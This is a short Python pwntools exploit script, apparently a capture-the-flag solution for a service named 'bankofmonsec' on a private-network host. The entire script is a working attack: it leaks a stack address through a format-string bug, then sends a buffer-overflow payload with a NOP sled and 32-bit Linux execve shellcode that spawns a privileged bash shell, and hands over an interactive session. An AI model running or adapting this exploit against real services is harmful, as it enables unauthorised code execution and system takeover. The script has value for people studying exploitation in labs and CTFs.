from pwn import *

nop = b'\x90'

shellcode = b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'

#p = process('./bankofmonsec')
p = remote('192.168.0.14', 9000)

p.recvuntil(b'continue.')
p.recvline()
p.recvline()
p.send("%p\n")

addr = int(p.recvline().split()[-1], 16)

p.send('a'*32 + p32(addr+8) + nop*15 + shellcode + '\n')

p.interactive()